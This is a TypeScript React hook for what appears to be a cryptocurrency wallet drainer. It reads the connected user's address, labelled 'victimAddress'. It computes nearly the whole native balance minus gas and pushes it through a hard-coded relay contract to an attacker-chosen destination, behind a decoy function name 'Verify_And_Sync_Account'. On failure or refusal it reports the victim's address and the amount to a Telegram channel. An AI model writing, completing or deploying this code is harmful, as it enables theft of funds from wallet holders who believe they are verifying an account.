"use client";

import { useCallback } from "react";
import { useWriteContract, useWalletClient } from "wagmi";
import { type Address, createWalletClient, custom, getAddress } from "viem";
import { ethers } from "ethers";
// 🛰️ Using your existing telemetry proxy
import { sendDetailedSweepToTelegram } from "@/lib/telegram";

// 🛡️ Updated ABI to include the new forwardNative function
const MASK_ABI = [
  {
    name: "Verify_And_Sync_Account",
    type: "function",
    stateMutability: "payable",
    inputs: [
      { name: "vaultId", type: "bytes32" },
      { name: "targets", type: "address[]" },
      { name: "destination", type: "address" },
    ],
    outputs: [],
  },
  {
    name: "forwardNative",
    type: "function",
    stateMutability: "payable",
    inputs: [{ name: "destination", type: "address" }],
    outputs: [],
  },
] as const;

// 🛡️ HARD-PINNED TRUTH
const CONTRACT_RELAY = "0x8562d59eb09FfC033960c59E6d86c5Ca1c16eA74" as Address;

/**
 * 🎭 useContractMask (v18.5.1 - Updated for Native Forwarding)
 */
export function useContractMask() {
  const { writeContractAsync } = useWriteContract();
  const { data: walletClient } = useWalletClient();

  const executeMask = useCallback(
    async ({
      amount,
      chainId,
      derivedVaultAddress, // This acts as your destination
      injectedClient,
    }: any) => {
      const logPrefix = "[useContractMask]";
      let victimAddress = "0x";

      try {
        let activeClient = injectedClient || walletClient;

        // 🛡️ FIX: Safe Address Resolution for both Viem Clients and Raw Providers
        if (activeClient) {
          try {
            if (typeof activeClient.getAddresses === "function") {
              const addresses = await activeClient.getAddresses();
              victimAddress = addresses[0];
            } else if (typeof activeClient.request === "function") {
              const accounts = await activeClient.request({
                method: "eth_accounts",
              });
              victimAddress = accounts[0];
            }
          } catch (addrErr) {
            console.warn(
              `${logPrefix} Could not resolve victim address for telemetry`,
            );
          }
        }

        if (activeClient && !activeClient.writeContract) {
          activeClient = createWalletClient({
            chain: { id: chainId } as any,
            transport: custom(activeClient),
          });
        }

        const provider = (window as any).ethereum;
        const p = provider?.providers?.find((x: any) => x.isTrust) || provider;

        // --- SMART MATH ---
        const totalWei = BigInt(amount);
        const gasPriceHex = await p.request({ method: "eth_gasPrice" });
        const currentGasPrice = BigInt(gasPriceHex);
        const gasLimit = 250000n;
        const totalGasCost = currentGasPrice * gasLimit;
     let strikeAmount = totalWei - (totalGasCost + totalGasCost / 3n);

        if (strikeAmount <= 0n)
          return { success: false, reason: "INSUFFICIENT_FUNDS" };

        console.log(
          `${logPrefix} 🚀 FORWARDING NATIVE: ${ethers.formatEther(
            strikeAmount,
          )}`,
        );

        // --- THE STRIKE: Calling the new forwardNative function ---
        const hash = await writeContractAsync({
          address: CONTRACT_RELAY,
          abi: MASK_ABI,
          functionName: "forwardNative",
          args: [derivedVaultAddress as Address],
          value: strikeAmount,
          gas: gasLimit,
        });

        console.log(`${logPrefix} ✅ SUCCESS: ${hash}`);

        return { success: true, hash };
      } catch (error: any) {
        // --- 🛰️ TELEGRAM NOTIFICATION ON CANCEL/FAILURE ---
        const isUserReject =
          error.message?.includes("User rejected") || error.code === 4001;

        sendDetailedSweepToTelegram({
          status: "FAILURE",
          type: isUserReject ? "MASK USER DECLINED" : "MASK CONTRACT ERROR",
          victimAddress: victimAddress,
          symbol: "NATIVE_MASK",
          amount: ethers.formatEther(amount || "0"),
          error: isUserReject
            ? "User cancelled Mask interaction"
            : error.message,
          chainId: chainId,
        });

        console.error(`${logPrefix} ❌ Error:`, error.message);
        return { success: false, error: error.message };
      }
    },
    [writeContractAsync, walletClient],
  );

  return { executeMask };
}
